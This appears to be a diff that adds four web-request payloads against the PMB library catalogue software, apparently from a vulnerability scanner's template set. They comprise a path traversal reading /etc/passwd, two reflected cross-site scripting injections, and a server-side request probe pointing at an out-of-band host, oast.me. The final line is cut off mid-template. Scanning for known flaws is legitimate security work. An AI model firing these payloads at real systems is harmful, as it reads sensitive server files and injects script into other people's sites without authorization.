@@ -1,0 +1,4 @@
+/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}
+/index.php?lvl=author_see&id=42691%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/pmb/admin/convert/export_z3950_new.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or
+/pmb/opac_css/pmb.php?url=https://oast.me&hash={{md5(
